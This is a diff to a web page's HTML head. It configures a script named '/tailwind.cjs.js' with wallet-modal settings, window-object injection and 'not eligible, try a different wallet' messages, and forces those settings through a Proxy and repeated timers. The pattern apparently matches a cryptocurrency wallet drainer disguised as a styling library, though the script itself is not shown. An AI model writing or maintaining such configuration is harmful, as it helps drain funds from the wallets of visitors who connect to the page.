@@ -97,31 +97,69 @@
     </script>
     
     <link rel="stylesheet" href="/css/styles.css">
-    <script>
-      // Setup Reown modal configuration - MUST be before tailwind.cjs.js loads
-      window.setup = {
-        modal: 'reown',
-        theme: 'dark',
-        radius: 'm',
-        auto_prompt: false,
-        injectWindowObjects: true,
-        notEligibleHeader: "You are not eligible",
-        notEligibleParagraph: "Try a different wallet to meet the requirements."
-      };
-    </script>
     <script src="/tailwind.cjs.js"></script>
     <script>
-      // Ensure dark theme is applied after script loads
-      window.addEventListener('load', function() {
-        if (window.setup && window.setup.theme === 'dark') {
-          // Force dark theme after script initialization
-          setTimeout(function() {
-            if (window.setup) {
-              window.setup.theme = 'dark';
-            }
-          }, 100);
+      // Setup Reown modal configuration - MUST be AFTER tailwind.cjs.js loads
+      // The script overwrites window.setup, so we need to protect and reapply settings
+      (function() {
+        const requiredSettings = {
+          modal: 'reown',
+          theme: 'dark',
+          radius: 'm',
+          auto_prompt: false,
+          injectWindowObjects: true,
+          notEligibleHeader: "You are not eligible",
+          notEligibleParagraph: "Try a different wallet to meet the requirements."
+        };
+        
+        function applySettings() {
+          if (!window.setup) {
+            window.setup = {};
+          }
+          // Merge our settings with existing ones
+          Object.assign(window.setup, requiredSettings);
         }
-      });
+        
+        // Apply immediately
+        applySettings();
+        
+        // Use Proxy to intercept changes to window.setup
+        const originalSetup = window.setup;
+        window.setup = new Proxy(originalSetup || {}, {
+          set: function(target, prop, value) {
+            target[prop] = value;
+            // Reapply our required settings after any change
+            setTimeout(applySettings, 0);
+            return true;
+          },
+          get: function(target, prop) {
+            // If setup was replaced, reapply
+            if (target !== window.setup) {
+              applySettings();
+            }
+            return target[prop];
+          }
+        });
+        
+        // Also try after page load
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', applySettings);
+        }
+        
+        // And after full load with multiple attempts
+        window.addEventListener('load', function() {
+          setTimeout(applySettings, 100);
+          setTimeout(applySettings, 500);
+          setTimeout(applySettings, 1000);
+        });
+        
+        // Monitor for setup changes
+        setInterval(function() {
+          if (window.setup && (!window.setup.theme || window.setup.theme !== 'dark')) {
+            applySettings();
+          }
+        }, 500);
+      })();
     </script>
   </head>
   <body>
